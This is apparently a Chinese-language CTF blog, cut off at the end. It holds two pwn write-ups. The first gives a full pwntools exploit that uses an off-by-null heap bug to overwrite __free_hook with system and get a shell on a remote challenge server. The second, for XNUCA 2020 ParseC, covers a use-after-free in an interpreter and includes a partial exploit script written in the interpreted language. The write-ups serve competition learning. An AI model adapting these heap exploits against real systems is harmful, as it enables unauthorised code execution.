<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">safe_read</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, a1, <span class="number">0xF0</span>uLL);</span><br><span class="line">  result = &amp;a1[a2];</span><br><span class="line">  *result = <span class="number">0</span>;                                  <span class="comment">// off by null</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这个题只要实现堆重叠即可任意地址开辟写入，采用house of einherjar 来实现，但是需要伪造堆块，绕过unlink检查，修改free_hook为system函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li  = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;47.111.104.99&quot;</span></span><br><span class="line">server_port = <span class="number">52403</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">i, s, d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(s))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">i</span>):</span>	</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	ad()</span><br><span class="line">	ad()</span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0xF8</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0xF8</span>)</span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0xF8</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0xF8</span>)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	ad()</span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	<span class="comment"># leak heap</span></span><br><span class="line">	ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\nD&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	heap_base = leak - <span class="number">0x260</span></span><br><span class="line">	li(<span class="string">&#x27;heap_base : &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		ad()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		rm(i)</span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		ad()</span><br><span class="line"></span><br><span class="line">	dp(<span class="number">7</span>)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	main_arena = <span class="number">0x3afc40</span></span><br><span class="line">	main_arena = <span class="number">0x3ebc40</span></span><br><span class="line">	libc_base = leak - main_arena - <span class="number">96</span></span><br><span class="line">	free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">		md(i, <span class="number">10</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(i))</span><br><span class="line">		rm(i)</span><br><span class="line">	overlap = heap_base + <span class="number">0xa50</span></span><br><span class="line">	<span class="comment">#rm(7)</span></span><br><span class="line">	<span class="comment"># passby unlink</span></span><br><span class="line">	md(<span class="number">7</span>, <span class="number">0xf8</span>, p64(heap_base + <span class="number">0xb50</span>) + p64(heap_base + <span class="number">0xb50</span>)) <span class="comment"># merge to this</span></span><br><span class="line"></span><br><span class="line">	md(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;BBBB&#x27;</span>)</span><br><span class="line">	p = p64(heap_base + <span class="number">0x950</span>)</span><br><span class="line">	p += p64(heap_base + <span class="number">0x950</span>)</span><br><span class="line">	md(<span class="number">9</span>, <span class="number">0x10</span>, p)</span><br><span class="line">	rm(<span class="number">8</span>) <span class="comment"># house of einherjar</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">		ad()</span><br><span class="line"></span><br><span class="line">	ad() <span class="comment"># index 7</span></span><br><span class="line">	md(<span class="number">7</span>, <span class="number">0x10</span>, <span class="string">&#x27;AA&#x27;</span>)</span><br><span class="line">	rm(<span class="number">7</span>)</span><br><span class="line">	md(<span class="number">8</span>, <span class="number">0x10</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">	ad() <span class="comment"># index 9</span></span><br><span class="line">	ad() <span class="comment"># index 10</span></span><br><span class="line">	md(<span class="number">10</span>, <span class="number">0x10</span>, p64(system))</span><br><span class="line">	</span><br><span class="line">	md(<span class="number">9</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	rm(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/11/01/wp-xhb-2020/" data-id="ckhemv84y005wwdcmhuq2gdlf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-xnuca-2020" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/31/wp-xnuca-2020/" class="article-date">
  <time datetime="2020-10-31T14:51:39.000Z" itemprop="datePublished">2020-10-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/31/wp-xnuca-2020/">wp-xnuca-2020</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XNUCA-WP"><a href="#XNUCA-WP" class="headerlink" title="XNUCA WP"></a>XNUCA WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一次比赛虽然只做出了一道pwn,但是感觉收获不错，只够交wp的资格了，线下可能就比较悬。也白票出题人的代码是咋写的^_^，以前也是好奇在获得shell之后是如何实现输入token的。</p>
<p>还有以前也想学一下解释器是怎么实现的, 这次比赛pwn parsec出了个语言解释器, 也给了对应的源码, 源码不是很多, 但是非常精小而强悍。晚上利用该漏洞调试至凌晨4点，第二天才发现原来调试的一直是debug模式的解释器，不得不重新改改heap的偏移,然后后面打远程打不通…泄漏远程heap时，发现远程偏移比本地小0x410，这里卡了好久，，，tcl。下次比赛好好加油!!!</p>
<h2 id="ParseC"><a href="#ParseC" class="headerlink" title="ParseC"></a>ParseC</h2><p>给了源码</p>
<p><a href="">下载</a></p>
<p>这个题比较有意思, 用被解释的语言写exp。下面是这个解释器实例代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fibonacci sequence</span></span><br><span class="line">func fun&#123; </span><br><span class="line">	<span class="keyword">if</span>(x &lt;= <span class="number">2</span>)&#123;  </span><br><span class="line">		<span class="keyword">return</span>(<span class="number">1</span>);  </span><br><span class="line">	&#125;</span><br><span class="line">	y = <span class="number">0</span>;</span><br><span class="line">	x = x - <span class="number">1</span>;</span><br><span class="line">	y = fun(x);</span><br><span class="line">	x = x - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span>(y + fun(x));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// save the Fibonacci sequence of 1 to 15 in an array </span></span><br><span class="line"><span class="function"><span class="built_in">array</span> <span class="title">arr</span><span class="params">(<span class="number">15</span>)</span></span>;	</span><br><span class="line">x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>( x &lt;= <span class="number">15</span> )&#123;</span><br><span class="line">	arr[x - <span class="number">1</span>] = fun(x);</span><br><span class="line">	x = <span class="number">1</span> + x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Fibonacci sequence:&quot;</span>);</span><br><span class="line"><span class="comment">// print the Fibonacci sequence of 1 to 15</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">15</span>)&#123;			</span><br><span class="line">	print(arr[i]);</span><br><span class="line">	i=i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><p>数组越接访问,但不可赋值</p>
<p>类型混淆</p>
<p>字符串赋值直接赋值指针变量, 还有free时没有对指针进行清0, 导致uaf漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (token == Sym || token == ArraySym || token == StrSym) &#123;</span><br><span class="line">        symbol* s = token_val.ptr;</span><br><span class="line">        <span class="keyword">int</span> tktype = token;</span><br><span class="line">        <span class="keyword">int</span> index;</span><br><span class="line">        match(tktype);</span><br><span class="line">        <span class="keyword">if</span> (tktype == ArraySym) &#123;</span><br><span class="line">            match(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">            index = expression();</span><br><span class="line">            match(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            match(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt; s-&gt;value) &#123;</span><br><span class="line">                s-&gt;pointer.<span class="built_in">list</span>[index].value = expression();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;line %.*s: Index out of range\n&quot;</span>,(<span class="keyword">int</span>)(src - old_src), old_src);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            match(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (token == Str) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s-&gt;pointer.funcp)</span><br><span class="line">                    <span class="built_in">free</span>(s-&gt;pointer.funcp); <span class="comment">// not set ptr as null, uaf vul</span></span><br><span class="line">                s-&gt;pointer.funcp = (<span class="keyword">char</span>*)token_val.ptr;</span><br><span class="line">                s-&gt;type = StrSym;</span><br><span class="line">                match(Str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (token == Char) &#123;</span><br><span class="line">                s-&gt;value = token_val.val;</span><br><span class="line">                s-&gt;type = Char;</span><br><span class="line">                match(Char);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (token == StrSym)&#123;</span><br><span class="line">                s-&gt;type = token_val.ptr-&gt;type;</span><br><span class="line">                s-&gt;value = token_val.ptr-&gt;value;</span><br><span class="line">                s-&gt;pointer = token_val.ptr-&gt;pointer;</span><br><span class="line">                match(StrSym);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                s-&gt;value = expression();</span><br><span class="line">                s-&gt;type = Num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        match(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>开始前期, 我还以为可以利用类型混淆来实现任意读写, 由于程序是有pie的, 不能直接静态执行脚本实现任意地址读和写。</p>
<p>数组与字符串是储存在堆里的, 原本打算是通过数组来泄漏libc, 后面发现行不通, 以double方式打印, 某些不符合double类型储存规范的, 直接为0。然而后面发现puts打印字符串可以泄漏libc, 采用字符串uaf漏洞+ 数组方式来进行修改释放后chunk的fd实现任意地址开辟, 这里需要精心的伪造.还有该解释器中定义的变量都是以double类型储存的, 在进行修改为值为地址时, 输入值为double类型的字符串, 需要进行一些转换。单个数组元素大小为0x40，实现修改的只能是采用数组来实现修改了， 那如何实现数组任意地址写入呢?就需要解释器中的字符串uaf漏洞进行修改fd, 采用partial write实现修改tcahe bin 0x51中的fd, 采用一次数组输入实现修改fd, 指向的内存, 后一次则是修改该内存的值。 修改<code>__free_hook</code>为<code>system</code>, free时传入’bin/sh;’ 即可。坑: 本地打通, 远程打不通，远程中堆中不存在0x410的缓冲chunk。本地却存在，在打远程时，先开辟0x400大小的堆，以保证本地与远程的heap偏移一致。</p>
<h4 id="脚本执行exp"><a href="#脚本执行exp" class="headerlink" title="脚本执行exp"></a>脚本执行exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">func write_to_target &#123;</span><br><span class="line">	unuse = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">	arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	x = <span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span>;</span><br><span class="line">	y = x;</span><br><span class="line">	z = x;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;free----&quot;</span>; </span><br><span class="line">	y = <span class="string">&quot;free------&quot;</span>;</span><br><span class="line">	z = <span class="string">&quot;free---------&quot;</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;AAAAAAAA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	z = x;</span><br><span class="line">	x = <span class="string">&quot;12---------------&quot;</span>; <span class="comment">// free x</span></span><br><span class="line">	x = z;</span><br><span class="line">	x = <span class="string">&quot;12345454AAAAAAA--------------&quot;</span>; <span class="comment">// free z</span></span><br><span class="line">	x = z;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;/bin/sh;aasfasdfjasdfklajsdfjasdjff&quot;</span>; <span class="comment">//free x </span></span><br><span class="line">	u = <span class="string">&quot;p&quot;</span>; <span class="comment">// modify chunk fd to 0x50 chunk for modify fd</span></span><br><span class="line">	a = <span class="string">&quot;malloc&quot;</span>;</span><br><span class="line">	b = <span class="string">&quot;H&quot;</span>; <span class="comment">// modify chunk fd to arr value</span></span><br><span class="line"></span><br><span class="line">	arr[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	n = <span class="number">0</span>;</span><br><span class="line">	read(n); <span class="comment">// input target addr to modify</span></span><br><span class="line">	arr[<span class="number">0</span>] = n;</span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr_2</span><span class="params">(<span class="number">1</span>)</span></span>; <span class="comment">// align</span></span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr_3</span><span class="params">(<span 